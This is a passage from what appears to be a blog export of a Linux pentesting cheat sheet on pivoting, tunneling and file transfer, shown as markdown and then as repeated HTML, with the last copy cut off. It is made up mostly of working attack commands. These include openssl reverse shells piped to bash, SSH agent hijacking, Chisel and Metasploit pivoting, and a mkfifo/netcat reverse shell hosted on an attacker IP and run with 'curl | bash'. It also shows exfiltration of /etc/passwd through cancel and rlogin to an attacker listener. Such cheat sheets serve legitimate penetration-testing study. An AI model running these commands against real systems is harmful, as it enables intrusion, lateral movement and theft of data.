Pentesting\n  - Linux\n  - Pivoting\n  - Port forwarding\n  - Tunneling\n  - Send files\ntoc: true\n---\n\n---\nObtain access to other resources on the internal network.\nTransfer files in smart ways.\n\n---\n<!-- more -->\n\n## Pivoting\n\n### Encrypted shell with OpenSSL\n```bash Generate a certificate\nopenssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\n```\n\n```bash Start an OpenSSL server\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 4444\n```\n\n```bash Connect from the client\nopenssl s_client -quiet -connect $IP:4444\n```\n\n<br>\n\n### Encrypted reverse shell with OpenSSl\n```bash Generate a certificate\nopenssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\n```\n\n```bash Set up the listening server\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 4444\n```\n\n```bash Connect to the sever from the client and initiate the shell\nopenssl s_client -quiet -connect $IP:4444 | bash\n```\n\n<br>\n\n### Alternative: separate input and output ports\n> Using separate ports for input and output in an encrypted shell can enhance control and clarity. It allows you to monitor and debug each communication stream independently, reduces congestion by handling data in distinct channels, and offers more granular security management. This setup is particularly beneficial in complex environments.\n\n```bash Server 1: Listen on Port 4444 (for sending commands)\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 4444\n```\n\n```bash Server 2: Listen on Port 4445 (for receiving output)\nopenssl s_server -quiet -key key.pem -cert cert.pem -port 4445\n```\n\n```bash Client: Set up a two-way encrypted shell\nopenssl s_client -quiet -connect <server_ip>:4444 | bash | openssl s_client -quiet -connect <server_ip>:4445\n```\n\n<br>\n\n### Hijacking SSH agent connections \n> In SSH, an SSH agent is a program that holds private keys used for authentication. The SSH agent allows users to authenticate to remote servers without re-entering their passphrase for every SSH connection. The agent's socket, typically found in the `/tmp` directory, is used to communicate with the SSH client.\n\n1. Find SSH process\n```bash\nps aux | grep ssh\n```\n2. Locate SSH agent socket\n```bash\nls -lah /tmp\n```\n3. List cached SSH keys\n```bash naming pattern like ssh-<random-string>/agent.<pid>, where <pid> is the process ID of the SSH agent\nSSH_AUTH_SOCK=/tmp/ssh-<..>/agent.<pid> ssh-add -l\n```\n4. Hijack the SSH agent\n```bash\nSSH_AUTH_SOCK=/tmp/ssh-<..>/agent.<pid> ssh user@target\n```\n\n<br>\n\n### Metasploit `route`\n```bash Add a route manually\nmsf6 > route add 169.254.0.0 255.255.0.0 1\nmsf6 > route add 172.19.176.0 255.255.240.0 1\n```\n```bash Print the routing table\nmsf6 > route print\n```\n```bash Get specific route information\nmsf6 > route get 169.254.204.110\n```\n```bash Remove a specific route\nmsf6 > route remove 172.19.176.0/20 1\n```\n\n<br>\n\n## Metasploit `autoroute`\n```bash Background the current session\nmeterpreter > background\n```\n```bash Use the autoroute module\nmsf6 > use post/multi/manage/autoroute\n```\n```bash Set the session and subnet\nmsf6 post(multi/manage/autoroute) > set SESSION 1\nmsf6 post(multi/manage/autoroute) > set SUBNET 169.254.0.0\nmsf6 post(multi/manage/autoroute) > set NETMASK /16\n```\n```bash Run the module\nmsf6 post(multi/manage/autoroute) > run\n```\n```bash Check the routing table\nmsf6 post(multi/manage/autoroute) > route\n```\n\n<br>\n\n## Tunneling (port forwarding)\n\n### SSH\n| Argument | Legend | Explanation |\n| --- | --- | --- |\n| `-L` | `local_port:remote_address:remote_port` | local port forwarding |\n| `-R` | `port:local_address:local_port` | remote port forwarding |\n| `-D` | `local_port` | dynamic port forwarding - creates a socks proxy on localhost |\n| `-N` |  | do not execute a remote command - useful for just forwarding ports |\n\n<br>\n\n### Chisel\n> Chisel is a fast TCP tunnel, transported over HTTP, secured via SSH. Single executable including both client and server. Written in Go (golang). Chisel is mainly useful for passing through firewalls, though it can also be used to provide a secure endpoint into your network. Chisel is very similar to crowbar though achieves much higher performance. _(as described by its author)_\n\nServer (attacker machine with IP `10.10.10.20`)\n```bash\nchisel server -p 8000 --reverse\n```\nClient (victim machine with IP `10.10.10.10`, another host with IP `10.10.10.30`)\n```bash Forward local port 80 from the attacker on port 80 on the victim localhost\n./chisel client 10.10.10.20:8000 R:80:127.0.0.1:80\n```\n```bash Forward local port 4444 from the attacker on port 80 on the remote host 10.10.10.30\n./chisel client 10.10.10.20:8000 R:4444:10.10.10.30:80\n```\n```bash Set up a SOCKS5 proxy on port 1080 on the attacker \n./chisel client 10.10.10.20:8000 R:socks\n```\n\n<br>\n\n### ProxyChains (and port scanning)\n1. Establish SSH connection with dynamic port forwarding\n```bash\nssh -D 1337 user@$IP\n```\n\n2. Configure ProxyChains for dynamic port forwarding\n```bash\necho \"socks5 127.0.0.1 1337\" | sudo tee -a /etc/proxychains.conf\n# Ensure to comment out any socks4 lines in /etc/proxychains.conf\n```\n\n3. Perform port scan through the SSH tunnel\n```bash\nproxychains nmap -sT 127.0.0.1\n```\n\n<br>\n\n### Metasploit\n```bash\nportfwd add -l 1234 -p 21 -r 10.10.10.20 \nportfwd list\n```\n\n<br>\n\n## Transfer files\n\n### Host and download reverse shell\nOn attacker machine\n```bash attacker host with IP 10.10.10.20\necho 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.10.20 9001 >/tmp/f' > rev.sh\npython3 -m http.server 80\n```\nDownload and run reverse shell\n```bash Method 1\ncurl http://10.10.10.20/rev.sh | bash &\n```\n```bash Method 2\ncurl http://10.10.10.20/rev.sh -o /dev/shm/rev.sh; chmod +x /dev/shm/rev.sh\n/dev/shm/rev.sh\n```\n\n<br>\n\n### Encrypt data in transit\n```bash Encrypt\nopenssl enc -aes-256-cbc -pbkdf2 -k strongPass < input.txt > input.txt.enc\n```\n```bash Decrypt\nopenssl enc -d -aes-256-cbc -pbkdf2 -k strongPass < input.txt.enc > input.txt\n```\n\n<br>\n\n### Exfiltraion with `cancel` and `rlogin`\n> **`cancel`**: A command typically used to cancel print jobs, but it can also be misused for transferring data if it sends data to a networked print server.\n> **`rlogin`**: A remote login program that can be used to connect to another machine over the network. It can also be used to send data if its misconfigured or used in an unconventional way.\n\nSet up a listener (attacker machine)\n```bash\nnc -lvnp 443\n```\nSend data\n```bash cancel\ncancel -u \"$(cat /etc/passwd | base64)\" -h $IP:443\n```\n```bash rlogin\nrlogin -l \"$(cat /etc/passwd | base64)\" -p 443 $IP\n```\n\n<br>\n\n### Send and request data with `curl`\n```bash\ncurl -X PUT http://10.10.10.10/file.bin --data-binary @filename.bin\n\ncurl -X MOVE -H 'Destination: http://10.10.10.10/filename.bin' http://10.10.10.10/file.bin \n```\n\n<br>\n\n---\n---","slug":"Pentesting/Linux/pivot-tunnel-and-send-files","published":1,"updated":"2024-09-23T06:18:55.865Z","comments":1,"layout":"post","photos":[],"_id":"cm1emkmhv000q6gvga736eb17","content":"<hr>\n<p>Obtain access to other resources on the internal network.<br>Transfer files in smart ways.</p>\n<hr>\n<span id=\"more\"></span>\n\n<h2 id=\"Pivoting\"><a href=\"#Pivoting\" class=\"headerlink\" title=\"Pivoting\"></a>Pivoting</h2><h3 id=\"Encrypted-shell-with-OpenSSL\"><a href=\"#Encrypted-shell-with-OpenSSL\" class=\"headerlink\" title=\"Encrypted shell with OpenSSL\"></a>Encrypted shell with OpenSSL</h3><pre><div class=\"caption\"><span>Generate a certificate</span></div><code class=\"highlight bash\">openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes</code></pre>\n\n<pre><div class=\"caption\"><span>Start an OpenSSL server</span></div><code class=\"highlight bash\">openssl s_server -quiet -key key.pem -cert cert.pem -port 4444</code></pre>\n\n<pre><div class=\"caption\"><span>Connect from the client</span></div><code class=\"highlight bash\">openssl s_client -quiet -connect <span class=\"variable\">$IP</span>:4444</code></pre>\n\n<br>\n\n<h3 id=\"Encrypted-reverse-shell-with-OpenSSl\"><a href=\"#Encrypted-reverse-shell-with-OpenSSl\" class=\"headerlink\" title=\"Encrypted reverse shell with OpenSSl\"></a>Encrypted reverse shell with OpenSSl</h3><pre><div class=\"caption\"><span>Generate a certificate</span></div><code class=\"highlight bash\">openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes</code></pre>\n\n<pre><div class=\"caption\"><span>Set up the listening server</span></div><code class=\"highlight bash\">openssl s_server -quiet -key key.pem -cert cert.pem -port 4444</code></pre>\n\n<pre><div class=\"caption\"><span>Connect to the sever from the client and initiate the shell</span></div><code class=\"highlight bash\">openssl s_client -quiet -connect <span class=\"variable\">$IP</span>:4444 | bash</code></pre>\n\n<br>\n\n<h3 id=\"Alternative-separate-input-and-output-ports\"><a href=\"#Alternative-separate-input-and-output-ports\" class=\"headerlink\" title=\"Alternative: separate input and output ports\"></a>Alternative: separate input and output ports</h3><blockquote>\n<p>Using separate ports for input and output in an encrypted shell can enhance control and clarity. It allows you to monitor and debug each communication stream independently, reduces congestion by handling data in distinct channels, and offers more granular security management. This setup is particularly beneficial in complex environments.</p>\n</blockquote>\n<pre><div class=\"caption\"><span>Server 1: Listen on Port 4444 (for sending commands)</span></div><code class=\"highlight bash\">openssl s_server -quiet -key key.pem -cert cert.pem -port 4444</code></pre>\n\n<pre><div class=\"caption\"><span>Server 2: Listen on Port 4445 (for receiving output)</span></div><code class=\"highlight bash\">openssl s_server -quiet -key key.pem -cert cert.pem -port 4445</code></pre>\n\n<pre><div class=\"caption\"><span>Client: Set up a two-way encrypted shell</span></div><code class=\"highlight bash\">openssl s_client -quiet -connect &lt;server_ip&gt;:4444 | bash | openssl s_client -quiet -connect &lt;server_ip&gt;:4445</code></pre>\n\n<br>\n\n<h3 id=\"Hijacking-SSH-agent-connections\"><a href=\"#Hijacking-SSH-agent-connections\" class=\"headerlink\" title=\"Hijacking SSH agent connections\"></a>Hijacking SSH agent connections</h3><blockquote>\n<p>In SSH, an SSH agent is a program that holds private keys used for authentication. The SSH agent allows users to authenticate to remote servers without re-entering their passphrase for every SSH connection. The agents socket, typically found in the <code>/tmp</code> directory, is used to communicate with the SSH client.</p>\n</blockquote>\n<ol>\n<li>Find SSH process<pre><code class=\"highlight bash\">ps aux | grep ssh</code></pre></li>\n<li>Locate SSH agent socket<pre><code class=\"highlight bash\"><span class=\"built_in\">ls</span> -lah /tmp</code></pre></li>\n<li>List cached SSH keys<pre><div class=\"caption\"><span>naming pattern like ssh-<random-string>/agent.<pid>, where <pid> is the process ID of the SSH agent</span></div><code class=\"highlight bash\">SSH_AUTH_SOCK=/tmp/ssh-&lt;..&gt;/agent.&lt;pid&gt; ssh-add -l</code></pre></li>\n<li>Hijack the SSH agent<pre><code class=\"highlight bash\">SSH_AUTH_SOCK=/tmp/ssh-&lt;..&gt;/agent.&lt;pid&gt; ssh user@target</code></pre></li>\n</ol>\n<br>\n\n<h3 id=\"Metasploit-route\"><a href=\"#Metasploit-route\" class=\"headerlink\" title=\"Metasploit route\"></a>Metasploit <code>route</code></h3><pre><div class=\"caption\"><span>Add a route manually</span></div><code class=\"highlight bash\">msf6 &gt; route add 169.254.0.0 255.255.0.0 1\nmsf6 &gt; route add 172.19.176.0 255.255.240.0 1</code></pre>\n<pre><div class=\"caption\"><span>Print the routing table</span></div><code class=\"highlight bash\">msf6 &gt; route <span class=\"built_in\">print</span></code></pre>\n<pre><div class=\"caption\"><span>Get specific route information</span></div><code class=\"highlight bash\">msf6 &gt; route get 169.254.204.110</code></pre>\n<pre><div class=\"caption\"><span>Remove a specific route</span></div><code class=\"highlight bash\">msf6 &gt; route remove 172.19.176.0/20 1</code></pre>\n\n<br>\n\n<h2 id=\"Metasploit-autoroute\"><a href=\"#Metasploit-autoroute\" class=\"headerlink\" title=\"Metasploit autoroute\"></a>Metasploit <code>autoroute</code></h2><pre><div class=\"caption\"><span>Background the current session</span></div><code class=\"highlight bash\">meterpreter &gt; background</code></pre>\n<pre><div class=\"caption\"><span>Use the autoroute module</span></div><code class=\"highlight bash\">msf6 &gt; use post/multi/manage/autoroute</code></pre>\n<pre><div class=\"caption\"><span>Set the session and subnet</span></div><code class=\"highlight bash\">msf6 post(multi/manage/autoroute) &gt; <span class=\"built_in\">set</span> SESSION 1\nmsf6 post(multi/manage/autoroute) &gt; <span class=\"built_in\">set</span> SUBNET 169.254.0.0\nmsf6 post(multi/manage/autoroute) &gt; <span class=\"built_in\">set</span> NETMASK /16</code></pre>\n<pre><div class=\"caption\"><span>Run the module</span></div><code class=\"highlight bash\">msf6 post(multi/manage/autoroute) &gt; run</code></pre>\n<pre><div class=\"caption\"><span>Check the routing table</span></div><code class=\"highlight bash\">msf6 post(multi/manage/autoroute) &gt; route</code></pre>\n\n<br>\n\n<h2 id=\"Tunneling-port-forwarding\"><a href=\"#Tunneling-port-forwarding\" class=\"headerlink\" title=\"Tunneling (port forwarding)\"></a>Tunneling (port forwarding)</h2><h3 id=\"SSH\"><a href=\"#SSH\" class=\"headerlink\" title=\"SSH\"></a>SSH</h3><table>\n<thead>\n<tr>\n<th>Argument</th>\n<th>Legend</th>\n<th>Explanation</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>-L</code></td>\n<td><code>local_port:remote_address:remote_port</code></td>\n<td>local port forwarding</td>\n</tr>\n<tr>\n<td><code>-R</code></td>\n<td><code>port:local_address:local_port</code></td>\n<td>remote port forwarding</td>\n</tr>\n<tr>\n<td><code>-D</code></td>\n<td><code>local_port</code></td>\n<td>dynamic port forwarding - creates a socks proxy on localhost</td>\n</tr>\n<tr>\n<td><code>-N</code></td>\n<td></td>\n<td>do not execute a remote command - useful for just forwarding ports</td>\n</tr>\n</tbody></table>\n<br>\n\n<h3 id=\"Chisel\"><a href=\"#Chisel\" class=\"headerlink\" title=\"Chisel\"></a>Chisel</h3><blockquote>\n<p>Chisel is a fast TCP tunnel, transported over HTTP, secured via SSH. Single executable including both client and server. Written in Go (golang). Chisel is mainly useful for passing through firewalls, though it can also be used to provide a secure endpoint into your network. Chisel is very similar to crowbar though achieves much higher performance. <em>(as described by its author)</em></p>\n</blockquote>\n<p>Server (attacker machine with IP <code>10.10.10.20</code>)</p>\n<pre><code class=\"highlight bash\">chisel server -p 8000 --reverse</code></pre>\n<p>Client (victim machine with IP <code>10.10.10.10</code>, another host with IP <code>10.10.10.30</code>)</p>\n<pre><div class=\"caption\"><span>Forward local port 80 from the attacker on port 80 on the victim localhost</span></div><code class=\"highlight bash\">./chisel client 10.10.10.20:8000 R:80:127.0.0.1:80</code></pre>\n<pre><div class=\"caption\"><span>Forward local port 4444 from the attacker on port 80 on the remote host 10.10.10.30</span></div><code class=\"highlight bash\">./chisel client 10.10.10.20:8000 R:4444:10.10.10.30:80</code></pre>\n<pre><div class=\"caption\"><span>Set up a SOCKS5 proxy on port 1080 on the attacker</span></div><code class=\"highlight bash\">./chisel client 10.10.10.20:8000 R:socks</code></pre>\n\n<br>\n\n<h3 id=\"ProxyChains-and-port-scanning\"><a href=\"#ProxyChains-and-port-scanning\" class=\"headerlink\" title=\"ProxyChains (and port scanning)\"></a>ProxyChains (and port scanning)</h3><ol>\n<li><p>Establish SSH connection with dynamic port forwarding</p>\n<pre><code class=\"highlight bash\">ssh -D 1337 user@<span class=\"variable\">$IP</span></code></pre>\n</li>\n<li><p>Configure ProxyChains for dynamic port forwarding</p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;socks5 127.0.0.1 1337&quot;</span> | <span class=\"built_in\">sudo</span> <span class=\"built_in\">tee</span> -a /etc/proxychains.conf\n<span class=\"comment\"># Ensure to comment out any socks4 lines in /etc/proxychains.conf</span></code></pre>\n</li>\n<li><p>Perform port scan through the SSH tunnel</p>\n<pre><code class=\"highlight bash\">proxychains nmap -sT 127.0.0.1</code></pre></li>\n</ol>\n<br>\n\n<h3 id=\"Metasploit\"><a href=\"#Metasploit\" class=\"headerlink\" title=\"Metasploit\"></a>Metasploit</h3><pre><code class=\"highlight bash\">portfwd add -l 1234 -p 21 -r 10.10.10.20 \nportfwd list</code></pre>\n\n<br>\n\n<h2 id=\"Transfer-files\"><a href=\"#Transfer-files\" class=\"headerlink\" title=\"Transfer files\"></a>Transfer files</h2><h3 id=\"Host-and-download-reverse-shell\"><a href=\"#Host-and-download-reverse-shell\" class=\"headerlink\" title=\"Host and download reverse shell\"></a>Host and download reverse shell</h3><p>On attacker machine</p>\n<pre><div class=\"caption\"><span>attacker host with IP 10.10.10.20</span></div><code class=\"highlight bash\"><span class=\"built_in\">echo</span> <span class=\"string\">&#x27;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2&gt;&amp;1|nc 10.10.10.20 9001 &gt;/tmp/f&#x27;</span> &gt; rev.sh\npython3 -m http.server 80</code></pre>\n<p>Download and run reverse shell</p>\n<pre><div class=\"caption\"><span>Method 1</span></div><code class=\"highlight bash\">curl http://10.10.10.20/rev.sh | bash &amp;</code></pre>\n<pre><div class=\"caption\"><span>Method 2</span></div><code class=\"highlight bash\">curl http://10.10.10.20/rev.sh -o /dev/shm/rev.sh; <span class=\"built_in\">chmod</span> +x /dev/shm/rev.sh\n/dev/shm/rev.sh</code></pre>\n\n<br>\n\n<h3 id=\"Encrypt-data-in-transit\"><a href=\"#Encrypt-data-in-transit\" class=\"headerlink\" title=\"Encrypt data in transit\"></a>Encrypt data in transit</h3><pre><div class=\"caption\"><span>Encrypt</span></div><code class=\"highlight bash\">openssl enc -aes-256-cbc -pbkdf2 -k strongPass &lt; input.txt &gt; input.txt.enc</code></pre>\n<pre><div class=\"caption\"><span>Decrypt</span></div><code class=\"highlight bash\">openssl enc -d -aes-256-cbc -pbkdf2 -k strongPass &lt; input.txt.enc &gt; input.txt</code></pre>\n\n<br>\n\n<h3 id=\"Exfiltraion-with-cancel-and-rlogin\"><a href=\"#Exfiltraion-with-cancel-and-rlogin\" class=\"headerlink\" title=\"Exfiltraion with cancel and rlogin\"></a>Exfiltraion with <code>cancel</code> and <code>rlogin</code></h3><blockquote>\n<p><strong><code>cancel</code></strong>: A command typically used to cancel print jobs, but it can also be misused for transferring data if it sends data to a networked print server.<br><strong><code>rlogin</code></strong>: A remote login program that can be used to connect to another machine over the network. It can also be used to send data if its misconfigured or used in an unconventional way.</p>\n</blockquote>\n<p>Set up a listener (attacker machine)</p>\n<pre><code class=\"highlight bash\">nc -lvnp 443</code></pre>\n<p>Send data</p>\n<pre><div class=\"caption\"><span>cancel</span></div><code class=\"highlight bash\">cancel -u <span class=\"string\">&quot;<span class=\"subst\">$(cat /etc/passwd | base64)</span>&quot;</span> -h <span class=\"variable\">$IP</span>:443</code></pre>\n<pre><div class=\"caption\"><span>rlogin</span></div><code class=\"highlight bash\">rlogin -l <span class=\"string\">&quot;<span class=\"subst\">$(cat /etc/passwd | base64)</span>&quot;</span> -p 443 <span class=\"variable\">$IP</span></code></pre>\n\n<br>\n\n<h3 id=\"Send-and-request-data-with-curl\"><a href=\"#Send-and-request-data-with-curl\" class=\"headerlink\" title=\"Send and request data with curl\"></a>Send and request data with <code>curl</code></h3><pre><code class=\"highlight bash\">curl -X PUT http://10.10.10.10/file.bin --data-binary @filename.bin\n\ncurl -X MOVE -H <span class=\"string\">&#x27;Destination: http://10.10.10.10/filename.bin&#x27;</span> http://10.10.10.10/file.bin</code></pre>\n\n<br>\n\n<hr>\n<hr>\n","excerpt":"<hr>\n<p>Obtain access to other resources on the internal network.<br>Transfer files in smart ways.</p>\n<hr>","more":"<h2 id=\"Pivoting\"><a href=\"#Pivoting\" class=\"headerlink\" title=\"Pivoting\"></a>Pivoting</h2><h3 id=\"Encrypted-shell-with-OpenSSL\"><a href=\"#Encrypted-shell-with-OpenSSL\" class=\"headerlink\" title=\"Encrypted shell with OpenSSL\"></a>Encrypted shell with OpenSSL</h3><pre><div class=\"caption\"><span>Generate a certificate</span></div><code class=\"highlight bash\">openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes</code></pre>\n\n<pre><div class=\"caption\"><span>Start an OpenSSL server</span></div><code class=\"highlight bash\">openssl s_server -quiet -key key.pem -cert cert.pem -port 4444</code></pre>\n\n<pre><div class=\"caption\"><span>Connect from the client</span></div><code class=\"highlight bash\">openssl s_client -quiet -connect <span class=\"variable\">$IP</span>:4444</code></pre>\n\n<br>\n\n<h3 id=\"Encrypted-reverse-shell-with-OpenSSl\"><a href=\"#Encrypted-reverse-shell-with-OpenSSl\" class=\"headerlink\" title=\"Encrypted reverse shell with OpenSSl\"></a>Encrypted reverse shell with OpenSSl</h3><pre><div class=\"caption\"><span>Generate a certificate</span></div><code class=\"highlight bash\">openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes</code></pre>\n\n<pre><div class=\"caption\"><span>Set up the listening server</span></div><code class=\"highlight bash\">openssl s_server -quiet -key key.pem -cert cert.pem -port 4444</code></pre>\n\n<pre><div class=\"caption\"><span>Connect to the sever from the client and initiate the shell</span></div><code class=\"highlight bash\">openssl s_client -quiet -connect <span class=\"variable\">$IP</span>:4444 | bash</code></pre>\n\n<br>\n\n<h3 id=\"Alternative-separate-input-and-output-ports\"><a href=\"#Alternative-separate-input-and-output-ports\" class=\"headerlink\" title=\"Alternative: separate input and output ports\"></a>Alternative: separate input and output ports</h3><blockquote>\n<p>Using separate ports for input and output in an encrypted shell can enhance control and clarity. It allows you to monitor and debug each communication stream independently, reduces congestion by handling data in distinct channels, and offers more granular security management. This setup is particularly beneficial in complex environments.</p>\n</blockquote>\n<pre><div class=\"caption\"><span>Server 1: Listen on Port 4444 (for sending commands)</span></div><code class=\"highlight bash\">openssl s_server -quiet -key key.pem -cert cert.pem -port 4444</code></pre>\n\n<pre><div class=\"caption\"><span>Server 2: Listen on Port 4445 (for receiving output)</span></div><code class=\"highlight bash\">openssl s_server -quiet -key key.pem -cert cert.pem -port 4445</code></pre>\n\n<pre><div class=\"caption\"><span>Client: Set up a two-way encrypted shell</span></div><code class=\"highlight bash\">openssl s_client -quiet -connect &lt;server_ip&gt;:4444 | bash | openssl s_client -quiet -connect &lt;server_ip&gt;:4445</code></pre>\n\n<br>\n\n<h3 id=\"Hijacking-SSH-agent-connections\"><a href=\"#Hijacking-SSH-agent-connections\" class=\"headerlink\" title=\"Hijacking SSH agent connections\"></a>Hijacking SSH agent connections</h3><blockquote>\n<p>In SSH, an SSH agent is a program that holds private keys used for authentication. The SSH agent allows users to authenticate to remote servers without re-entering their passphrase for every SSH connection. The agents socket, typically found in the <code>/tmp</code> directory, is used to communicate with the SSH client.</p>\n</blockquote>\n<ol>\n<li>Find SSH process<pre><code class=\"highlight bash\">ps aux | grep ssh</code></pre></li>\n<li>Locate SSH agent socket<pre><code class=\"highlight bash\"><span class=\"built_in\">ls</span> -lah /tmp</code></pre></li>\n<li>List cached SSH keys<pre><div class=\"caption\"><span>naming pattern like ssh-<random-string>/agent.<pid>, where <pid> is the process ID of the SSH agent</span></div><code class=\"highlight bash\">SSH_AUTH_SOCK=/tmp/ssh-&lt;..&gt;/agent.&lt;pid&gt; ssh-add -l</code></pre></li>\n<li>Hijack the SSH agent<pre><code class=\"highlight bash\">SSH_AUTH_SOCK=/tmp/ssh-&lt;..&gt;/agent.&lt;pid&gt; ssh user@target</code></pre></li>\n</ol>\n<br>\n\n<h3 id=\"Metasploit-route\"><a href=\"#Metasploit-route\" class=\"headerlink\" title=\"Metasploit route\"></a>Metasploit <code>route</code></h3><pre><div class=\"caption\"><span>Add a route manually</span></div><code class=\"highlight bash\">msf6 &gt; route add 169.254.0.0 255.255.0.0 1\nmsf6 &gt; route add 172.19.176.0 255.255.240.0 1</code></pre>\n<pre><div class=\"caption\"><span>Print the routing table</span></div><code class=\"highlight bash\">msf6 &gt; route <span class=\"built_in\">print</span></code></pre>\n<pre><div class=\"caption\"><span>Get specific route information</span></div><code class=\"highlight bash\">msf6 &gt; route get 169.254.204.110</code></pre>\n<pre><div class=\"caption\"><span>Remove a specific route</span></div><code class=\"highlight bash\">msf6 &gt; route remove 172.19.176.0/20 1</code></pre>\n\n<br>\n\n<h2 id=\"Metasploit-autoroute\"><a href=\"#Metasploit-autoroute\" class=\"headerlink\" title=\"Metasploit autoroute\"></a>Metasploit <code>autoroute</code></h2><pre><div class=\"caption\"><span>Background the current session</span></div><code class=\"highlight bash\">meterpreter &gt; background</code></pre>\n<pre><div class=\"caption\"><span>Use the autoroute module</span></div><code class=\"highlight bash\">msf6 &gt; use post/multi/manage/autoroute</code></pre>\n<pre><div class=\"caption\"><span>Set the session and subnet</span></div><code class=\"highlight bash\">msf6 post(multi/manage/autoroute) &gt; <span class=\"built_in\">set</span> SESSION 1\nmsf6 post(multi/manage/autoroute) &gt; <span class=\"built_in\">set</span> SUBNET 169.254.0.0\nmsf6 post(multi/manage/autoroute) &gt; <span class=\"built_in\">set</span> NETMASK /16</code></pre>\n<pre><div class=\"caption\"><span>Run the module</span></div><code class=\"highlight bash\">msf6 post(multi/manage/autoroute) &gt; run</code></pre>\n<pre><div class=\"caption\"><span>Check the routing table</span></div><code class=\"highlight bash\">msf6 post(multi/manage/autoroute) &gt; route</code></pre>\n\n<br>\n\n<h2 id=\"Tunneling-port-forwarding\"><a href=\"#Tunneling-port-forwarding\" class=\"headerlink\" title=\"Tunneling (port forwarding)\"></a>Tunneling (port forwarding)</h2><h3 id=\"SSH\"><a href=\"#SSH\" class=\"headerlink\" title=\"SSH\"></a>SSH</h3><table>\n<thead>\n<tr>\n<th>Argument</th>\n<th>Legend</th>\n<th>Explanation</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>-L</code></td>\n<td><code>local_port:remote_address:remote_port</code></td>\n<td>local port forwarding</td>\n</tr>\n<tr>\n<td><code>-R</code></td>\n<td><code>port:local_address:local_port</code></td>\n<td>remote port forwarding</td>\n</tr>\n<tr>\n<td><code>-D</code></td>\n<td><code>local_port</code></td>\n<td>dynamic port forwarding - creates a socks proxy on localhost</td>\n</tr>\n<tr>\n<td><code>-N</code></td>\n<td></td>\n<td>do not execute a remote command - useful for just forwarding ports</td>\n</tr>\n</tbody></table>\n<br>\n\n<h3 id=\"Chisel\"><a href=\"#Chisel\" class=\"headerlink\" title=\"Chisel\"></a>Chisel</h3><blockquote>\n<p>Chisel is a fast TCP tunnel, transported over HTTP, secured via SSH. Single executable including both client and server. Written in Go (golang). Chisel is mainly useful for passing through firewalls, though it can also be used to provide a secure endpoint into your network. Chisel is very similar to crowbar though achieves much higher performance. <em>(as described by its author)</em></p>\n</blockquote>\n<p>Server (attacker machine with IP <code>10.10.10.20</code>)</p>\n<pre><code class=\"highlight bash\">chisel server -p 8000 --reverse</code></pre>\n<p>Client (victim machine with IP <code>10.10.10.10</code>, another host with IP <code>10.10.10.30</code>)</p>\n<pre><div class=\"caption\"><span>Forward local port 80 from the attacker on port 80 on the victim localhost</span></div><code class=\"highlight bash\">./chisel client 10.10.10.20:8000 R:80:127.0.0.1:80</code></pre>\n<pre><div class=\"caption\"><span>Forward local port 4444 from the attacker on port 80 on the remote host 10.10.10.30</span></div><code class=\"highlight bash\">./chisel client 10.10.10.20:8000 R:4444:10.10.10.30:80</code></pre>\n<pre><div class=\"caption\"><span>Set up a SOCKS5 proxy on port 1080 on the attacker</span></div><code class=\"highlight bash\">./chisel client 10.10.10.20:8000 R:socks</code></pre>\n\n<br>\n\n<h3 id=\"ProxyChains-and-port-scanning\"><a href=\"#ProxyChains-and-port-scanning\" class=\"headerlink\" title=\"ProxyChains (and port scanning)\"></a>ProxyChains (and port scanning)</h3><ol>\n<li><p>Establish SSH connection with dynamic port forwarding</p>\n<pre><code class=\"highlight bash\">ssh -D 1337 user@<span class=\"variable\">$IP</span></code></pre>\n</li>\n<li><p>Configure ProxyChains for dynamic port forwarding</p>\n<pre><code class=\"highlight bash\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;socks5 127.0.0.1 1337&quot;</span> | <span class=\"built_in\">sudo</span> <span class=\"built_in\">tee</span> -a /etc/proxychains.conf\n<span class=\"comment\"># Ensure to comment out any socks4 lines in /etc/proxychains.conf</span></code></pre>\n</li>\n<li><p>Perform port scan through the SSH tunnel</p>\n<pre><code class=\"highlight bash\">proxychains nmap -sT 127.0.0.1</code></pre></li>\n</ol>\n<br>\n\n<h3 id=\"Metasploit\"><a href=\"#Metasploit\" class=\"headerlink\" title=\"Metasploit\"></a>Metasploit</h3><pre><code class=\"highlight bash\">portfwd add -l 1234 -p 21 -r 10.10.10.20 \nportfwd list</code></pre>\n\n<br>\n\n<h2 id=\"Transfer-files\"><a href=\"#Transfer-files\" class=\"headerlink\" title=\"Transfer files\"></a>Transfer files</h2><h3 id=\"Host-and-download-reverse-shell\"><a href=\"#Host-and-download-reverse-shell\" class=\"headerlink\" title=\"Host and download reverse shell\"></a>Host and download reverse shell</h3><p>On attacker machine</p>\n<pre><div class=\"caption\"><span>attacker host with IP 10.10.10.20</span></div><code class=\"highlight bash\"><span class=\"built_in\">echo</span> <span class=\"string\">&#x27;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2&gt;&amp;1|nc 10.10.10.20 9001 &gt;/tmp/f&#x27;</span> &gt; rev.sh\npython3 -m http.server 80</code></pre>\n<p>Download and run reverse shell</p>\n<pre><div class=\"caption\"><span>Method 1</span></div><code class=\"highlight bash\">curl http://10.10.10.20/rev.sh | bash &amp;</code></pre>\n<pre><div class=\"caption\"><span>Method 2</span></div><code class=\"highlight bash\">curl http://10.10.10.20/rev.sh -o /dev/shm/rev.sh; <span class=\"built_in\">chmod</span> +x /dev/shm/rev.sh\n/dev/shm/rev.sh</code></pre>\n\n<br>\n\n<h3 id=\"Encrypt-data-in-transit\"><a href=\"#Encrypt-data-in-transit\" class=\"headerlink\" title=\"Encrypt data in transit\"></a>Encrypt data in transit</h3><pre><div class=\"caption\"><span>Encrypt</span></div><code class=\"highlight bash\">openssl enc 